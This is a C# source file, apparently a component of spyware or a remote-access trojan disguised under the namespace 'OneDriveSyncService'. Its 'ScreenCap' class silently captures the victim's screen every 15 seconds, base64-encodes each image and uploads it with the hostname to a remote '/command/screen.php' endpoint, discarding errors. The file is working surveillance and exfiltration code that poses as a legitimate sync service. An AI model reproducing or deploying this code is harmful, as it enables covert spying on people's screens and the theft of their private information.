using System;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Drawing.Imaging;
using System.Threading;
using System.Timers;
using System.Net;
using System.Text;
using System.Collections.Specialized;
using OneDriveSyncService;

namespace OneDriveSyncService
{
    internal class ScreenCap
    {
        static WebClient webclient = new WebClient();
        static bool isStarted = false;
        static Bitmap bitmap;
        static MemoryStream memoryStream;
        static Graphics memoryGraphics;
        static Rectangle rc;
        static string commands;
        static System.Timers.Timer timer = new System.Timers.Timer();
        static Thread th_CaptureDesktop;
        private static string _serverName;

        public static void initClientDesktop(string serverName)
        {
            _serverName = serverName;
            timer.Interval = 15000;
            timer.Elapsed += new ElapsedEventHandler(onTimedEvent);
            timer.Enabled = true;
            timer.Start();
        }

        public static void StartDesktopCapture()
        {
            isStarted = true;
            Console.WriteLine("Desktop Capture started.");
        }

        public static void StopDesktopCapture()
        {

            isStarted = false;
            Console.WriteLine("Desktop Capture stopped.");
        }



        private static MemoryStream GetDesktop()
        {
            memoryStream = new MemoryStream(10000);
            try
            {
                rc = Screen.PrimaryScreen.Bounds;
                bitmap = new Bitmap(rc.Width, rc.Height, PixelFormat.Format32bppArgb);
                memoryGraphics = Graphics.FromImage(bitmap);
                memoryGraphics.CopyFromScreen(rc.X, rc.Y, 0, 0, rc.Size, CopyPixelOperation.SourceCopy);
            }
            catch (Exception exception)
            {
                exception.ToString();
            }
            bitmap.Save(memoryStream, ImageFormat.Jpeg);
            return memoryStream;
        }


        static void onTimedEvent(object sender, EventArgs e)
        {
            if (!isStarted) return;
            try
            {

                NameValueCollection payload = new NameValueCollection();
                payload.Add("name", Dns.GetHostName());
                payload.Add("screen", Convert.ToBase64String(GetDesktop().ToArray()));

                webclient.UploadValues(_serverName + "/command/screen.php", payload);
            }
            catch (Exception)
            {
                Console.WriteLine("--error send desktop--");
            }
        }


    }
}